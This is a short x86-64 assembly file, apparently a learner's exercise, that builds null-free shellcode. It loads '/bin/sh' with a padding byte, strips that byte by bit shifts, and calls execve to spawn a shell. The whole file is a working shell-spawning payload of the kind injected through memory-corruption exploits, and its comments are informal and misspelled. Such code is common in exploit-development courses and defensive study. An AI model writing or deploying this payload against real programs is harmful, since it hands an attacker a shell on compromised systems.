
.section .text
.globl _start

_start:

		xorq %rsi, %rsi
		xorq %rdx, %rdx	
		
		#moving the string /bin/sh into rbx in the reversal format become of little indian.
		movq $0x1168732f6e69622f, %rbx
		
		#shifting value of 8 to left in rbx
		shl $0x08, %rbx 
		shr $0x08, %rbx

		pushq %rbx
		
		
		xorq %rax, %rax
		#system call for execve()
		movb $59, %al
		movq %rsp, %rdi
		

		shl $0x38, %rax
		shr $0x38, %rax

		syscall
		
